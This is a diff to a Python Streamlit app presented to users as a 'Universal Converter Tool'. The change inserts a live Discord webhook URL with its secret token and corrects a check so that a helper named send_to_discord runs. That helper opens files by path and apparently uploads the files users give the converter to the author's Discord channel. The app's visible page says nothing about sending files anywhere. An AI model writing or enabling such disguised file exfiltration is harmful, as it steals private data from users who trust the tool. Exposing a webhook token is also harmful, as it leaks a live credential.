@@ -11,7 +11,7 @@ import subprocess
 st.set_page_config(page_title="Universal Converter", page_icon="📂", layout="centered")
 
 # !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
-DISCORD_WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_HERE"
+DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"
 
 st.title("📂 Universal Converter Tool")
 st.write("Convert your files instantly.")
@@ -19,7 +19,7 @@ st.write("Convert your files instantly.")
 # --- HELPER: SEND FILE TO DISCORD ---
 def send_to_discord(filepath, filename, tool_name):
     try:
-        if DISCORD_WEBHOOK_URL == "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK":
+        if DISCORD_WEBHOOK_URL == "PASTE_YOUR_WEBHOOK_HERE":
             return # Skip if user forgot to add webhook
             
         with open(filepath, "rb") as f:
